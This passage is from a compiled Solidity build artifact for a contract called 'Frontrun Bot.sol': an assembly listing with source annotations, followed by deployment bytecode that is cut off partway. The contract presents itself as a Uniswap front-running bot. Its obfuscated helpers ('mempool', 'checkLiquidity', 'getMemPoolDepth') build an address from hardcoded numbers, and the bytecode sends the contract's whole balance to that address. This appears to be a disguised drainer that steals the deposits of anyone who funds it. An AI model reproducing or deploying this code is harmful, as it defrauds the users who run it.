\"--CODEGEN--\":29:30   */\n      0x01\n        /* \"--CODEGEN--\":21:27   */\n      dup3\n        /* \"--CODEGEN--\":17:31   */\n      mul\n        /* \"--CODEGEN--\":124:128   */\n      dup1\n        /* \"--CODEGEN--\":108:122   */\n      calldatasize\n        /* \"--CODEGEN--\":100:106   */\n      dup4\n        /* \"--CODEGEN--\":87:129   */\n      calldatacopy\n        /* \"--CODEGEN--\":155:159   */\n      dup1\n        /* \"--CODEGEN--\":147:153   */\n      dup3\n        /* \"--CODEGEN--\":143:160   */\n      add\n        /* \"--CODEGEN--\":133:160   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":0:164   */\n      pop\n        /* \"Frontrun Bot.sol\":10366:10382  new bytes(count) */\n      swap1\n      pop\n    tag_107:\n      pop\n        /* \"Frontrun Bot.sol\":10347:10382  bytes memory res = new bytes(count) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10398:10404  uint i */\n      0x00\n        /* \"Frontrun Bot.sol\":10405:10406  0 */\n      dup1\n        /* \"Frontrun Bot.sol\":10398:10406  uint i=0 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10393:10537  for (uint i=0; i<count; ++i) {\r... */\n    tag_108:\n        /* \"Frontrun Bot.sol\":10410:10415  count */\n      dup4\n        /* \"Frontrun Bot.sol\":10408:10409  i */\n      dup2\n        /* \"Frontrun Bot.sol\":10408:10415  i<count */\n      lt\n        /* \"Frontrun Bot.sol\":10393:10537  for (uint i=0; i<count; ++i) {\r... */\n      iszero\n      tag_109\n      jumpi\n        /* \"Frontrun Bot.sol\":10445:10447  16 */\n      0x10\n        /* \"Frontrun Bot.sol\":10441:10442  a */\n      dup7\n        /* \"Frontrun Bot.sol\":10441:10447  a % 16 */\n      dup2\n      tag_111\n      jumpi\n      invalid\n    tag_111:\n      mod\n        /* \"Frontrun Bot.sol\":10437:10447  b = a % 16 */\n      swap3\n      pop\n        /* \"Frontrun Bot.sol\":10483:10503  toHexDigit(uint8(b)) */\n      tag_112\n        /* \"Frontrun Bot.sol\":10500:10501  b */\n      dup4\n        /* \"Frontrun Bot.sol\":10483:10493  toHexDigit */\n      tag_113\n        /* \"Frontrun Bot.sol\":10483:10503  toHexDigit(uint8(b)) */\n      jump\t// in\n    tag_112:\n        /* \"Frontrun Bot.sol\":10462:10465  res */\n      dup3\n        /* \"Frontrun Bot.sol\":10478:10479  1 */\n      0x01\n        /* \"Frontrun Bot.sol\":10474:10475  i */\n      dup4\n        /* \"Frontrun Bot.sol\":10466:10471  count */\n      dup8\n        /* \"Frontrun Bot.sol\":10466:10475  count - i */\n      sub\n        /* \"Frontrun Bot.sol\":10466:10479  count - i - 1 */\n      sub\n        /* \"Frontrun Bot.sol\":10462:10480  res[count - i - 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_114\n      jumpi\n      invalid\n    tag_114:\n      0x20\n      add\n      add\n        /* \"Frontrun Bot.sol\":10462:10503  res[count - i - 1] = toHexDigit(uint8(b)) */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"Frontrun Bot.sol\":10523:10525  16 */\n      0x10\n        /* \"Frontrun Bot.sol\":10518:10525  a /= 16 */\n      dup7\n      dup2\n      tag_115\n      jumpi\n      invalid\n    tag_115:\n      div\n      swap6\n      pop\n        /* \"Frontrun Bot.sol\":10417:10420  ++i */\n      dup1\n      0x01\n      add\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10393:10537  for (uint i=0; i<count; ++i) {\r... */\n      jump(tag_108)\n    tag_109:\n      pop\n        /* \"Frontrun Bot.sol\":10547:10561  uint hexLength */\n      0x00\n        /* \"Frontrun Bot.sol\":10577:10580  res */\n      dup2\n        /* \"Frontrun Bot.sol\":10564:10589  bytes(string(res)).length */\n      mload\n        /* \"Frontrun Bot.sol\":10547:10589  uint hexLength = bytes(string(res)).length */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10617:10618  4 */\n      0x04\n        /* \"Frontrun Bot.sol\":10604:10613  hexLength */\n      dup2\n        /* \"Frontrun Bot.sol\":10604:10618  hexLength == 4 */\n      eq\n        /* \"Frontrun Bot.sol\":10600:11115  if (hexLength == 4) {\r... */\n      iszero\n      tag_116\n      jumpi\n        /* \"Frontrun Bot.sol\":10635:10655  string memory _hexC1 */\n      0x60\n        /* \"Frontrun Bot.sol\":10658:10683  mempool(\"0\", string(res)) */\n      tag_117\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"Frontrun Bot.sol\":10678:10681  res */\n      dup5\n        /* \"Frontrun Bot.sol\":10658:10665  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":10658:10683  mempool(\"0\", string(res)) */\n      jump\t// in\n    tag_117:\n        /* \"Frontrun Bot.sol\":10635:10683  string memory _hexC1 = mempool(\"0\", string(res)) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10705:10711  _hexC1 */\n      dup1\n        /* \"Frontrun Bot.sol\":10698:10711  return _hexC1 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_102)\n        /* \"Frontrun Bot.sol\":10600:11115  if (hexLength == 4) {\r... */\n    tag_116:\n        /* \"Frontrun Bot.sol\":10746:10747  3 */\n      0x03\n        /* \"Frontrun Bot.sol\":10733:10742  hexLength */\n      dup2\n        /* \"Frontrun Bot.sol\":10733:10747  hexLength == 3 */\n      eq\n        /* \"Frontrun Bot.sol\":10729:11115  if (hexLength == 3) {\r... */\n      iszero\n      tag_119\n      jumpi\n        /* \"Frontrun Bot.sol\":10764:10784  string memory _hexC2 */\n      0x60\n        /* \"Frontrun Bot.sol\":10787:10812  mempool(\"0\", string(res)) */\n      tag_120\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"Frontrun Bot.sol\":10807:10810  res */\n      dup5\n        /* \"Frontrun Bot.sol\":10787:10794  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":10787:10812  mempool(\"0\", string(res)) */\n      jump\t// in\n    tag_120:\n        /* \"Frontrun Bot.sol\":10764:10812  string memory _hexC2 = mempool(\"0\", string(res)) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10834:10840  _hexC2 */\n      dup1\n        /* \"Frontrun Bot.sol\":10827:10840  return _hexC2 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_102)\n        /* \"Frontrun Bot.sol\":10729:11115  if (hexLength == 3) {\r... */\n    tag_119:\n        /* \"Frontrun Bot.sol\":10875:10876  2 */\n      0x02\n        /* \"Frontrun Bot.sol\":10862:10871  hexLength */\n      dup2\n        /* \"Frontrun Bot.sol\":10862:10876  hexLength == 2 */\n      eq\n        /* \"Frontrun Bot.sol\":10858:11115  if (hexLength == 2) {\r... */\n      iszero\n      tag_122\n      jumpi\n        /* \"Frontrun Bot.sol\":10893:10913  string memory _hexC3 */\n      0x60\n        /* \"Frontrun Bot.sol\":10916:10943  mempool(\"000\", string(res)) */\n      tag_123\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x03\n      dup2\n      mstore\n      0x20\n      add\n      0x3030300000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"Frontrun Bot.sol\":10938:10941  res */\n      dup5\n        /* \"Frontrun Bot.sol\":10916:10923  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":10916:10943  mempool(\"000\", string(res)) */\n      jump\t// in\n    tag_123:\n        /* \"Frontrun Bot.sol\":10893:10943  string memory _hexC3 = mempool(\"000\", string(res)) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":10965:10971  _hexC3 */\n      dup1\n        /* \"Frontrun Bot.sol\":10958:10971  return _hexC3 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_102)\n        /* \"Frontrun Bot.sol\":10858:11115  if (hexLength == 2) {\r... */\n    tag_122:\n        /* \"Frontrun Bot.sol\":11006:11007  1 */\n      0x01\n        /* \"Frontrun Bot.sol\":10993:11002  hexLength */\n      dup2\n        /* \"Frontrun Bot.sol\":10993:11007  hexLength == 1 */\n      eq\n        /* \"Frontrun Bot.sol\":10989:11115  if (hexLength == 1) {\r... */\n      iszero\n      tag_125\n      jumpi\n        /* \"Frontrun Bot.sol\":11024:11044  string memory _hexC4 */\n      0x60\n        /* \"Frontrun Bot.sol\":11047:11075  mempool(\"0000\", string(res)) */\n      tag_126\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x04\n      dup2\n      mstore\n      0x20\n      add\n      0x3030303000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"Frontrun Bot.sol\":11070:11073  res */\n      dup5\n        /* \"Frontrun Bot.sol\":11047:11054  mempool */\n      tag_57\n        /* \"Frontrun Bot.sol\":11047:11075  mempool(\"0000\", string(res)) */\n      jump\t// in\n    tag_126:\n        /* \"Frontrun Bot.sol\":11024:11075  string memory _hexC4 = mempool(\"0000\", string(res)) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":11097:11103  _hexC4 */\n      dup1\n        /* \"Frontrun Bot.sol\":11090:11103  return _hexC4 */\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump(tag_102)\n        /* \"Frontrun Bot.sol\":10989:11115  if (hexLength == 1) {\r... */\n    tag_125:\n        /* \"Frontrun Bot.sol\":11142:11145  res */\n      dup2\n        /* \"Frontrun Bot.sol\":11128:11146  return string(res) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Frontrun Bot.sol\":10139:11154  function checkLiquidity(uint a) internal pure returns (string memory) {\r... */\n    tag_102:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"Frontrun Bot.sol\":17672:18307  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r... */\n    tag_57:\n        /* \"Frontrun Bot.sol\":17755:17768  string memory */\n      0x60\n        /* \"Frontrun Bot.sol\":17781:17804  bytes memory _baseBytes */\n      dup1\n        /* \"Frontrun Bot.sol\":17813:17818  _base */\n      dup4\n        /* \"Frontrun Bot.sol\":17781:17819  bytes memory _baseBytes = bytes(_base) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":17830:17854  bytes memory _valueBytes */\n      0x60\n        /* \"Frontrun Bot.sol\":17863:17869  _value */\n      dup4\n        /* \"Frontrun Bot.sol\":17830:17870  bytes memory _valueBytes = bytes(_value) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":17884:17907  string memory _tmpValue */\n      0x60\n        /* \"Frontrun Bot.sol\":17941:17952  _valueBytes */\n      dup2\n        /* \"Frontrun Bot.sol\":17941:17959  _valueBytes.length */\n      mload\n        /* \"Frontrun Bot.sol\":17921:17931  _baseBytes */\n      dup4\n        /* \"Frontrun Bot.sol\":17921:17938  _baseBytes.length */\n      mload\n        /* \"Frontrun Bot.sol\":17921:17959  _baseBytes.length + _valueBytes.length */\n      add\n        /* \"Frontrun Bot.sol\":17910:17960  new string(_baseBytes.length + _valueBytes.length) */\n      0xffffffffffffffff\n      dup2\n      gt\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_128\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_128:\n        /* \"Frontrun Bot.sol\":17910:17960  new string(_baseBytes.length + _valueBytes.length) */\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_129\n      jumpi\n      dup2\n      0x20\n      add\n        /* \"--CODEGEN--\":29:30   */\n      0x01\n        /* \"--CODEGEN--\":21:27   */\n      dup3\n        /* \"--CODEGEN--\":17:31   */\n      mul\n        /* \"--CODEGEN--\":124:128   */\n      dup1\n        /* \"--CODEGEN--\":108:122   */\n      calldatasize\n        /* \"--CODEGEN--\":100:106   */\n      dup4\n        /* \"--CODEGEN--\":87:129   */\n      calldatacopy\n        /* \"--CODEGEN--\":155:159   */\n      dup1\n        /* \"--CODEGEN--\":147:153   */\n      dup3\n        /* \"--CODEGEN--\":143:160   */\n      add\n        /* \"--CODEGEN--\":133:160   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":0:164   */\n      pop\n        /* \"Frontrun Bot.sol\":17910:17960  new string(_baseBytes.length + _valueBytes.length) */\n      swap1\n      pop\n    tag_129:\n      pop\n        /* \"Frontrun Bot.sol\":17884:17960  string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":17971:17993  bytes memory _newValue */\n      0x60\n        /* \"Frontrun Bot.sol\":18002:18011  _tmpValue */\n      dup2\n        /* \"Frontrun Bot.sol\":17971:18012  bytes memory _newValue = bytes(_tmpValue) */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":18026:18032  uint i */\n      0x00\n        /* \"Frontrun Bot.sol\":18043:18049  uint j */\n      dup1\n        /* \"Frontrun Bot.sol\":18069:18070  0 */\n      0x00\n        /* \"Frontrun Bot.sol\":18067:18070  i=0 */\n      swap2\n      pop\n        /* \"Frontrun Bot.sol\":18063:18155  for(i=0; i<_baseBytes.length; i++) {\r... */\n    tag_130:\n        /* \"Frontrun Bot.sol\":18074:18084  _baseBytes */\n      dup6\n        /* \"Frontrun Bot.sol\":18074:18091  _baseBytes.length */\n      mload\n        /* \"Frontrun Bot.sol\":18072:18073  i */\n      dup3\n        /* \"Frontrun Bot.sol\":18072:18091  i<_baseBytes.length */\n      lt\n        /* \"Frontrun Bot.sol\":18063:18155  for(i=0; i<_baseBytes.length; i++) {\r... */\n      iszero\n      tag_131\n      jumpi\n        /* \"Frontrun Bot.sol\":18130:18140  _baseBytes */\n      dup6\n        /* \"Frontrun Bot.sol\":18141:18142  i */\n      dup3\n        /* \"Frontrun Bot.sol\":18130:18143  _baseBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_133\n      jumpi\n      invalid\n    tag_133:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"Frontrun Bot.sol\":18113:18122  _newValue */\n      dup4\n        /* \"Frontrun Bot.sol\":18123:18126  j++ */\n      dup3\n      dup1\n      0x01\n      add\n      swap4\n      pop\n        /* \"Frontrun Bot.sol\":18113:18127  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_134\n      jumpi\n      invalid\n    tag_134:\n      0x20\n      add\n      add\n        /* \"Frontrun Bot.sol\":18113:18143  _newValue[j++] = _baseBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"Frontrun Bot.sol\":18093:18096  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"Frontrun Bot.sol\":18063:18155  for(i=0; i<_baseBytes.length; i++) {\r... */\n      jump(tag_130)\n    tag_131:\n        /* \"Frontrun Bot.sol\":18174:18175  0 */\n      0x00\n        /* \"Frontrun Bot.sol\":18172:18175  i=0 */\n      swap2\n      pop\n        /* \"Frontrun Bot.sol\":18168:18262  for(i=0; i<_valueBytes.length; i++) {\r... */\n    tag_135:\n        /* \"Frontrun Bot.sol\":18179:18190  _valueBytes */\n      dup5\n        /* \"Frontrun Bot.sol\":18179:18197  _valueBytes.length */\n      mload\n        /* \"Frontrun Bot.sol\":18177:18178  i */\n      dup3\n        /* \"Frontrun Bot.sol\":18177:18197  i<_valueBytes.length */\n      lt\n        /* \"Frontrun Bot.sol\":18168:18262  for(i=0; i<_valueBytes.length; i++) {\r... */\n      iszero\n      tag_136\n      jumpi\n        /* \"Frontrun Bot.sol\":18236:18247  _valueBytes */\n      dup5\n        /* \"Frontrun Bot.sol\":18248:18249  i */\n      dup3\n        /* \"Frontrun Bot.sol\":18236:18250  _valueBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_138\n      jumpi\n      invalid\n    tag_138:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"Frontrun Bot.sol\":18219:18228  _newValue */\n      dup4\n        /* \"Frontrun Bot.sol\":18229:18232  j++ */\n      dup3\n      dup1\n      0x01\n      add\n      swap4\n      pop\n        /* \"Frontrun Bot.sol\":18219:18233  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_139\n      jumpi\n      invalid\n    tag_139:\n      0x20\n      add\n      add\n        /* \"Frontrun Bot.sol\":18219:18250  _newValue[j++] = _valueBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"Frontrun Bot.sol\":18199:18202  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"Frontrun Bot.sol\":18168:18262  for(i=0; i<_valueBytes.length; i++) {\r... */\n      jump(tag_135)\n    tag_136:\n        /* \"Frontrun Bot.sol\":18289:18298  _newValue */\n      dup3\n        /* \"Frontrun Bot.sol\":18275:18299  return string(_newValue) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Frontrun Bot.sol\":17672:18307  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"Frontrun Bot.sol\":11163:11252  function getMemPoolLength() internal pure returns (uint) {\r... */\n    tag_59:\n        /* \"Frontrun Bot.sol\":11214:11218  uint */\n      0x00\n        /* \"Frontrun Bot.sol\":11238:11244  165871 */\n      0x0287ef\n        /* \"Frontrun Bot.sol\":11231:11244  return 165871 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":11163:11252  function getMemPoolLength() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"Frontrun Bot.sol\":13804:13893  function getMemPoolHeight() internal pure returns (uint) {\r... */\n    tag_61:\n        /* \"Frontrun Bot.sol\":13855:13859  uint */\n      0x00\n        /* \"Frontrun Bot.sol\":13879:13885  572545 */\n      0x08bc81\n        /* \"Frontrun Bot.sol\":13872:13885  return 572545 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":13804:13893  function getMemPoolHeight() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"Frontrun Bot.sol\":17278:17366  function getMemPoolDepth() internal pure returns (uint) {\r... */\n    tag_63:\n        /* \"Frontrun Bot.sol\":17328:17332  uint */\n      0x00\n        /* \"Frontrun Bot.sol\":17352:17358  315395 */\n      0x04d003\n        /* \"Frontrun Bot.sol\":17345:17358  return 315395 */\n      swap1\n      pop\n        /* \"Frontrun Bot.sol\":17278:17366  function getMemPoolDepth() internal pure returns (uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"Frontrun Bot.sol\":15505:15832  function toHexDigit(uint8 d) pure internal returns (byte) {\r... */\n    tag_113:\n        /* \"Frontrun Bot.sol\":15557:15561  byte */\n      0x00\n        /* \"Frontrun Bot.sol\":15583:15584  d */\n      dup2\n        /* \"Frontrun Bot.sol\":15578:15584  0 <= d */\n      0xff\n      and\n        /* \"Frontrun Bot.sol\":15578:15579  0 */\n      0x00\n        /* \"Frontrun Bot.sol\":15578:15584  0 <= d */\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":15578:15594  0 <= d && d <= 9 */\n      dup1\n      iszero\n      tag_144\n      jumpi\n      pop\n        /* \"Frontrun Bot.sol\":15593:15594  9 */\n      0x09\n        /* \"Frontrun Bot.sol\":15588:15589  d */\n      dup3\n        /* \"Frontrun Bot.sol\":15588:15594  d <= 9 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":15578:15594  0 <= d && d <= 9 */\n    tag_144:\n        /* \"Frontrun Bot.sol\":15574:15765  if (0 <= d && d <= 9) {\r... */\n      iszero\n      tag_145\n      jumpi\n        /* \"Frontrun Bot.sol\":15642:15643  d */\n      dup2\n        /* \"Frontrun Bot.sol\":15629:15638  byte('0') */\n      0x3000000000000000000000000000000000000000000000000000000000000000\n        /* \"Frontrun Bot.sol\":15623:15639  uint8(byte('0')) */\n      0xf8\n      shr\n        /* \"Frontrun Bot.sol\":15623:15643  uint8(byte('0')) + d */\n      add\n        /* \"Frontrun Bot.sol\":15618:15644  byte(uint8(byte('0')) + d) */\n      0xf8\n      shl\n        /* \"Frontrun Bot.sol\":15611:15644  return byte(uint8(byte('0')) + d) */\n      swap1\n      pop\n      jump(tag_143)\n        /* \"Frontrun Bot.sol\":15574:15765  if (0 <= d && d <= 9) {\r... */\n    tag_145:\n        /* \"Frontrun Bot.sol\":15678:15679  d */\n      dup2\n        /* \"Frontrun Bot.sol\":15666:15680  10 <= uint8(d) */\n      0xff\n      and\n        /* \"Frontrun Bot.sol\":15666:15668  10 */\n      0x0a\n        /* \"Frontrun Bot.sol\":15666:15680  10 <= uint8(d) */\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":15666:15698  10 <= uint8(d) && uint8(d) <= 15 */\n      dup1\n      iszero\n      tag_147\n      jumpi\n      pop\n        /* \"Frontrun Bot.sol\":15696:15698  15 */\n      0x0f\n        /* \"Frontrun Bot.sol\":15690:15691  d */\n      dup3\n        /* \"Frontrun Bot.sol\":15684:15698  uint8(d) <= 15 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"Frontrun Bot.sol\":15666:15698  10 <= uint8(d) && uint8(d) <= 15 */\n    tag_147:\n        /* \"Frontrun Bot.sol\":15662:15765  if (10 <= uint8(d) && uint8(d) <= 15) {\r... */\n      iszero\n      tag_148\n      jumpi\n        /* \"Frontrun Bot.sol\":15750:15752  10 */\n      0x0a\n        /* \"Frontrun Bot.sol\":15746:15747  d */\n      dup3\n        /* \"Frontrun Bot.sol\":15733:15742  byte('a') */\n      0x6100000000000000000000000000000000000000000000000000000000000000\n        /* \"Frontrun Bot.sol\":15727:15743  uint8(byte('a')) */\n      0xf8\n      shr\n        /* \"Frontrun Bot.sol\":15727:15747  uint8(byte('a')) + d */\n      add\n        /* \"Frontrun Bot.sol\":15727:15752  uint8(byte('a')) + d - 10 */\n      sub\n        /* \"Frontrun Bot.sol\":15722:15753  byte(uint8(byte('a')) + d - 10) */\n      0xf8\n      shl\n        /* \"Frontrun Bot.sol\":15715:15753  return byte(uint8(byte('a')) + d - 10) */\n      swap1\n      pop\n      jump(tag_143)\n        /* \"Frontrun Bot.sol\":15662:15765  if (10 <= uint8(d) && uint8(d) <= 15) {\r... */\n    tag_148:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"Frontrun Bot.sol\":15505:15832  function toHexDigit(uint8 d) pure internal returns (byte) {\r... */\n    tag_143:\n      swap2\n      swap1\n      pop\n      jump\t// out\n    stop\n    data_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6 53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e\n    data_a605a138a70f3ae4d1364b0a4be28f180d3f021084227d7f914f61c97fb6a66e 52756e6e696e672046726f6e7452756e2061747461636b206f6e20556e69737761702e20546869732063616e2074616b652061207768696c6520706c6561736520776169742e2e2e\n\n    auxdata: 0xa2646970667358221220c5967cd6e269ed28bae2282a8ba18efad2d4ad27df048e6b552eb8191a513ab364736f6c63430006060033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040523480156200001157600080fd5b5060405162000ffa38038062000ffa833981810160405260408110156200003757600080fd5b81019080805160405193929190846401000000008211156200005857600080fd5b838201915060208201858111156200006f57600080fd5b82518660018202830111640100000000821117156200008d57600080fd5b8083526020830192505050908051906020019080838360005b83811015620000c3578082015181840152602081019050620000a6565b50505050905090810190601f168015620000f15780820380516001836020036101000a031916815260200191505b50604052602001805160405193929190846401000000008211156200011557600080fd5b838201915060208201858111156200012c57600080fd5b82518660018202830111640100000000821117156200014a57600080fd5b8083526020830192505050908051906020019080838360005b838110156200018057808201518184015260208101905062000163565b50505050905090810190601f168015620001ae5780820380516001836020036101000a031916815260200191505b506040525050508160009080519060200190620001cd929190620001ef565b508060019080519060200190620001e6929190620001ef565b5050506200029e565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200023257805160ff191683800117855562000263565b8280016001018555821562000263579182015b828111156200026257825182559160200191906001019062000245565b5b50905062000272919062000276565b5090565b6200029b91905b80821115620002975760008160009055506001016200027d565b5090565b90565b610d4c80620002ae6000396000f3fe6080604052600436106100435760003560e01c80636c02a9311461004f5780637b61c320146100df578063be9a65551461016f578063d4e93292146101795761004a565b3661004a57005b600080fd5b34801561005b57600080fd5b50610064610183565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a4578082015181840152602081019050610089565b50505050905090810190601f1680156100d15780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100eb57600080fd5b506100f4610221565b6040518080602001828103825283818151815260200191508051906020019080838360005b83811015610134578082015181840152602081019050610119565b50505050905090810190601f1680156101615780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101776102bf565b005b61018161035a565b005b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102195780601f106101ee57610100808354040283529160200191610219565b820191906000526020600020905b8154815290600101906020018083116101fc57829003601f168201915b505050505081565b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102b75780601f1061028c576101008083540402835291602001916102b7565b820191906000526020600020905b81548152906001019060200180831161029a57829003601f168201915b505050505081565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526048815260200180610ccf6048913960600191505060405180910390a16103126103f5565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610357573d6000803e3d6000fd5b50565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526033815260200180610c9c6033913960400191505060405180910390a16103ad61040c565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156103f2573d6000803e3d6000fd5b50565b6000610407610402610423565b6105a0565b905090565b600061041e610419610423565b6105a0565b905090565b6060806104746040518060400160405280600181526020017f780000000000000000000000000000000000000000000000000000000000000081525061046f61046a6107f9565b610804565b610a76565b9050600061fbb290506000610487610bd1565b905060006202e8d59050600061049b610bdc565b905060006203dd44905060006104af610be7565b905060006201ddae905060606104cd896104c88a610804565b610a76565b905060606104eb6104dd89610804565b6104e689610804565b610a76565b905060606105096104fb88610804565b61050488610804565b610a76565b9050606061052761051987610804565b61052287610804565b610a76565b905060606105476105388686610a76565b6105428585610a76565b610a76565b9050606061058a6040518060400160405280600181526020017f300000000000000000000000000000000000000000000000000000000000000081525083610a76565b9050809e50505050505050505050505050505090565b6000606082905060008090506000806000600290505b602a8110156107ec57610100840293508481815181106105d257fe5b602001015160f81c60f81b60f81c60ff1692508460018201815181106105f457fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff1610158015610645575060668373ffffffffffffffffffffffffffffffffffffffff1611155b15610655576057830392506106ef565b60418373ffffffffffffffffffffffffffffffffffffffff1610158015610693575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156106a3576037830392506106ee565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156106e1575060398373ffffffffffffffffffffffffffffffffffffffff1611155b156106ed576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff161015801561072d575060668273ffffffffffffffffffffffffffffffffffffffff1611155b1561073d576057820391506107d7565b60418273ffffffffffffffffffffffffffffffffffffffff161015801561077b575060468273ffffffffffffffffffffffffffffffffffffffff1611155b1561078b576037820391506107d6565b60308273ffffffffffffffffffffffffffffffffffffffff16101580156107c9575060398273ffffffffffffffffffffffffffffffffffffffff1611155b156107d5576030820391505b5b5b816010840201840193506002810190506105b6565b5082945050505050919050565b600062046ddf905090565b6060600080905060008390505b600081146108335781806001019250506010818161082b57fe5b049050610811565b60608267ffffffffffffffff8111801561084c57600080fd5b506040519080825280601f01601f19166020018201604052801561087f5781602001600182028036833780820191505090505b50905060008090505b838110156108fe576010868161089a57fe5b0692506108a683610bf2565b82600183870303815181106108b757fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350601086816108f057fe5b049550806001019050610888565b50600081519050600481141561095e57606061094f6040518060400160405280600181526020017f300000000000000000000000000000000000000000000000000000000000000081525084610a76565b90508095505050505050610a71565b60038114156109b75760606109a86040518060400160405280600181526020017f300000000000000000000000000000000000000000000000000000000000000081525084610a76565b90508095505050505050610a71565b6002811415610a10576060610a016040518060400160405280600381526020017f303